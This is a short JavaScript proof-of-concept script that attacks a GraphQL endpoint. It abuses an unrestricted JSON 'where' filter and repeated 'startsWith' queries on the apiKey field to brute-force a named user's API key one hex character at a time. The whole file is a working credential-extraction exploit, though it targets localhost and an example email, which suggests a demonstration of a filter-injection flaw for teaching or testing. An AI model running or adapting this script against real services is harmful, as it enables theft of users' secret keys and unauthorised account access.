import { fetch } from '@whatwg-node/fetch';

const url = 'http://localhost:4000/graphql';
const email = 'alice@example.com';

const query = /* GraphQL */ `
  query ($where: JSON) {
    findUsers(where: $where) {
      firstName
      lastName
      email
    }
  }
`;

console.time(`API key of ${email} found in`);

let key = '';
while (key.length < 16) {
  for (const char of '0123456789abcdef') {
    const where = { email, apiKey: { startsWith: key + char } };
    const { data, errors } = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query, variables: { where } }),
    }).then((response) => response.json());

    if (errors) {
      console.error(errors);
      process.exit(1);
    }

    if (data.findUsers.length > 0) {
      key += char;
      console.log(`Found char #${key.length}: ${key}`);
      break;
    }
  }
}

console.timeEnd(`API key of ${email} found in`);
